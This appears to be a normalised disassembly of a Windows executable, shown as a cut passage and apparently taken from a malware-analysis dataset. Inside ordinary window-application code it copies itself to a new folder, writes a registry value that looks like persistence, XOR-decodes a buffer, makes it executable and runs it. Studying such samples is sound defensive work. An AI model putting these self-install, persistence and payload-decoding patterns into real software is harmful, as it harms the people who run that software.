sub_401020
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x414 ]
push 0x208
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
mov esi [ Sleep@IAT ]
push 0x64
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call [ CreateDirectoryW@IAT ]
push 0xa
call esi
lea eax [ edi + 0x208 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push r--data
lea esi [ edi + 0x410 ]
push 0x104
push esi
call sub_40189a
add esp 0x14
lea eax [ ebp - 0x414 ]
push esi
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x418 ]
push esi
lea eax [ ebp - 0x414 ]
push eax
call [ MoveFileW@IAT ]
mov esi eax
jmp r-xdata
push [ edi + 0x618 ]
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40174b
mov esp ebp
pop ebp
retn 0x4
sub_401110
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0xffffffff
push [ ebx + 0x618 ]
call [ WaitForSingleObject@IAT ]
lea eax [ ebx + 0x410 ]
mov [ ebp - 0x8 ] 0x0
push eax
call [ lstrlenW@IAT ]
mov esi eax
xor edi edi
lea eax [ ebp - 0x8 ]
add esi esi
push eax
push r--data
push 0x80000001
mov [ ebp - 0xc ] esi
call [ RegCreateKeyW@IAT ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
push esi
test eax eax
lea eax [ ebx + 0x410 ]
push eax
push 0x1
push 0x0
jg r-xdata
push ebx
push 0x0
jmp r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn 0x4
cmp edi 0xa
jl r-xdata
push [ ebp - 0x8 ]
call [ RegSetValueExW@IAT ]
mov esi eax
inc edi
test esi esi
je r-xdata
mov esi [ ebp - 0xc ]
sub_4011d0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0xd48
call sub_4018dc
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor esi esi
mov [ esi ] 0x1
mov [ esi + 0x10c ] 0x1
mov [ esi + 0x524 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x210 ]
mov eax [ esi + 0x108 ]
add eax [ rw-data ]
jmp r-xdata
mov [ esi ] 0x1
lea edi [ esi + 0x1 ]
mov [ esi + 0x10c ] 0x1
mov eax [ rw-data ]
mov [ esi + 0x108 ] eax
mov eax [ rw-data ]
push [ rw-data ]
lea eax [ eax + rw-data ]
push eax
push edi
call sub_404f80
mov eax [ esi + 0x10c ]
add esp 0xc
dec eax
jne r-xdata
mov eax [ ebp - 0x210 ]
push ebx
push [ rw-data ]
push ecx
mov ecx esi
call sub_4013c0
jmp r-xdata
push eax
call sub_4018dc
mov ecx [ rw-data ]
mov ebx eax
mov [ esi + 0x108 ] ecx
mov ecx [ rw-data ]
push [ rw-data ]
lea ecx [ ecx + rw-data ]
push ecx
push edi
call sub_404f80
mov eax [ rw-data ]
add esp 0x10
lea ecx [ eax + rw-data ]
mov eax [ esi + 0x10c ]
dec eax
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x40
push eax
push ebx
call [ VirtualProtect@IAT ]
mov esi [ lstrcpynW@IAT ]
push 0x208
push r--data
push rw-data
call esi
push 0x208
push r--data
push rw-data
call esi
push r--data
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov esi [ CreateThread@IAT ]
push 0x0
push 0x0
push rw-data
push sub_401110
push 0x0
push 0x0
call esi
push 0x0
push 0x0
push rw-data
push sub_401020
push 0x0
push 0x0
mov edi eax
call esi
push eax
call [ CloseHandle@IAT ]
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
call ebx
mov esi [ Sleep@IAT ]
push 0xffffffff
call esi
push 0x208
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x0
call sub_401c44
int3
sub_4013c0
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x108 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
xor esi esi
test eax eax
je r-xdata
pop edi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
lea esp [ esp ]
cmp esi [ ebp - 0x8 ]
jbe r-xdata
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ edi + eax + 0x1 ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_401c6d
add esp 0x8
xor eax eax
test ebx ebx
je r-xdata
sub_401450
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ LoadStringW@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push 0x64
push rw-data
push 0x67
push edi
call esi
push 0x64
push rw-data
push 0x6d
push edi
call esi
mov ecx edi
call sub_401560
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xcf0000
push rw-data
push rw-data
push 0x0
mov [ rw-data ] edi
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
xor ecx ebp
pop esi
call sub_40174b
mov esp ebp
pop ebp
retn 0x10
push 0x0
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
push 0x6d
push edi
call [ LoadAcceleratorsW@IAT ]
mov esi [ GetMessageW@IAT ]
push 0x0
push 0x0
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40174b
mov esp ebp
pop ebp
retn 0x10
mov edi [ TranslateMessage@IAT ]
push ebx
mov ebx [ DispatchMessageW@IAT ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call edi
lea eax [ ebp - 0x20 ]
push eax
call ebx
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
call [ TranslateAcceleratorW@IAT ]
test eax eax
jne r-xdata
pop ebx
sub_401560
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x81
push ecx
mov [ ebp - 0x34 ] 0x30
mov [ ebp - 0x30 ] 0x3
mov [ ebp - 0x2c ] sub_401600
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] ecx
call [ LoadIconW@IAT ]
push 0x7f00
push 0x0
mov [ ebp - 0x1c ] eax
call [ LoadCursorW@IAT ]
push 0x81
push [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x6
mov [ ebp - 0x10 ] 0x6d
mov [ ebp - 0xc ] rw-data
call [ LoadIconW@IAT ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x34 ]
push eax
call [ RegisterClassExW@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40174b
mov esp ebp
pop ebp
retn
sub_401600
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_40f0bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub eax 0x2
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
sub eax 0xd
je r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ BeginPaint@IAT ]
lea eax [ esp + 0xc ]
push eax
push esi
call [ EndPaint@IAT ]
jmp r-xdata
sub eax 0x102
je r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
movzx eax cx
sub eax 0x68
je r-xdata
push 0x1
call sub_4018dc
add esp 0x4
mov [ esp + 0x8 ] eax
mov [ esp + 0x60 ] 0x0
test eax eax
je r-xdata
push 0x0
push sub_401710
push esi
push 0x67
push [ rw-data ]
call [ DialogBoxParamW@IAT ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ DefWindowProcW@IAT ]
jmp r-xdata
push 0x1
call sub_4018dc
call sub_4011d0
push esi
call [ DestroyWindow@IAT ]
jmp r-xdata
push [ ebp + 0x14 ]
push ecx
push 0x111
push esi
call [ DefWindowProcW@IAT ]
jmp r-xdata
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40174b
mov esp ebp
pop ebp
retn 0x10
sub_401710
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
dec eax
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
movzx eax ax
push eax
push [ ebp + 0x8 ]
call [ EndDialog@IAT ]
cmp ax 0x2
jne r-xdata
sub_40175a
push esi
push 0x4
push 0x20
call sub_4020e9
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_401789
push 0xc
push r--data
call sub_4021d0
and [ ebp - 0x1c ] 0x0
call sub_401b03
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4017cd
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4017c7
mov eax esi
call sub_402215
retn
sub_4017cd
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_4020b8
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
mov [ ebx ] eax
push ecx
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_402178
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_402178
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_4018dc
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40292d
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_402aec
pop ecx
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
push 0x1
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] r--data
push eax
lea ecx [ ebp - 0x10 ]
call sub_4029e4
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] r--data
push eax
call sub_402b1f
int3
sub_40192d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_402a22
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_402bcd
pop ecx
sub_401957
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_4019db
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_403501
push r--data
push r--data
call sub_401ae1
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_403410
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_402c25
call sub_401885
mov [ esp ] r--data
push r--data
call sub_401aab
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_403410
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_401a73
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_402b12
push esi
call sub_4024e9
push esi
call sub_4035b0
push esi
call sub_4035ca
push esi
call sub_40359f
push esi
call sub_4037db
add esp 0x18
pop esi
jmp sub_402ed3
sub_401aab
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
sub eax esi
add eax 0x3
shr eax 0x2
cmp [ ebp + 0xc ] esi
push edi
sbb edi edi
not edi
and edi eax
jbe r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
inc ebx
cmp ebx edi
jb r-xdata
call eax
sub_401ae1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_401b15
push 0x1c
push r--data
call sub_4021d0
push 0x8
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_401c2f
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_402215
retn
mov [ rw-data ] 0x1
push 0x8
call sub_402daf
pop ecx
push [ ebp + 0x8 ]
call sub_40198b
push r--data
push r--data
call sub_401aab
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_401aab
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_401c6d
push 0xc
push r--data
call sub_4021d0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
call sub_4040b2
add eax 0x20
push eax
push 0x1
call sub_4040f7
pop ecx
pop ecx
mov [ ebp - 0x4 ] edi
call sub_4040b2
add eax 0x20
push eax
call sub_403f09
pop ecx
mov esi eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp + 0x8 ]
call sub_4040b2
add eax 0x20
push eax
call sub_40418e
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_4040b2
add eax 0x20
push eax
push esi
call sub_403ed8
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_401d09
mov eax edi
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
jmp r-xdata
call sub_402215
retn
sub_401d1c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_405f5e
push esi
mov edi eax
call sub_406225
push esi
call sub_404f52
push eax
call sub_4060b0
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_402bcd
and [ esi + 0x1c ] 0x0
pop ecx
sub_401d88
push 0xc
push r--data
call sub_4021d0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
push esi
call sub_4040b8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_401d1c
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_401df7
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_402215
retn
sub_401dff
push 0x14
push r--data
call sub_4021d0
call sub_402e42
movzx esi ax
push 0x2
call sub_406ce9
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_406701
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_4064c4
test eax eax
jne r-xdata
push 0x1c
call sub_401f4f
cmp [ eax + r--data ] ebx
setne bl
call sub_402c05
and [ ebp - 0x4 ] 0x0
call sub_406716
test eax eax
jns r-xdata
push 0x10
call sub_401f4f
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_406dd2
mov [ rw-data ] eax
call sub_4069ca
test eax eax
jns r-xdata
push 0x1b
call sub_401f4f
call sub_406c07
test eax eax
jns r-xdata
push 0x8
call sub_4019a1
push 0x1
call sub_4019db
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_4019a1
call sub_406e2f
push esi
push eax
push 0x0
push __dos_header
call sub_401450
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_4019a1
call sub_4019cc
jmp sub_401f40
push esi
call sub_401c44
sub_401f80
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_406e7c
push [ ebp + 0x8 ]
call sub_40318f
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_40317a
pop ecx
pop ebp
retn
push 0x1
call sub_406e7c
pop ecx
sub_401fbd
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_401f80
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_4020b8
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
pop ebp
retn
sub_4020e9
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call sub_40316c
add esi 0x3e8
pop ecx
cmp esi [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406f2f
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_402131
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call sub_40316c
mov edi [ rw-data ]
add esi 0x3e8
pop ecx
cmp esi edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_40292d
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_402178
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call sub_40316c
add esi 0x3e8
pop ecx
cmp esi [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406e84
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4021d0
push sub_402230
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_402230
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov edi [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor edi [ rw-data ]
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40174b
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40174b
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_404f3b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
lea eax [ edi + eax * 4 ]
mov ebx [ eax ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov edx [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ edx + esi ]
call sub_40174b
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40174b
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_404ef2
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov [ ebp - 0x8 ] ebx
mov eax ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_404f22
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_404f3b
mov eax [ ebp + 0xc ]
push r--data
call sub_403410
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40174b
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_404f09
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40174b
sub_4023c4
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
lea eax [ ebp - 0x31c ]
push 0x4c
push 0x0
push eax
call sub_406fb0
lea eax [ ebp - 0x320 ]
add esp 0xc
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_40318f
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_406e7c
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40174b
mov esp ebp
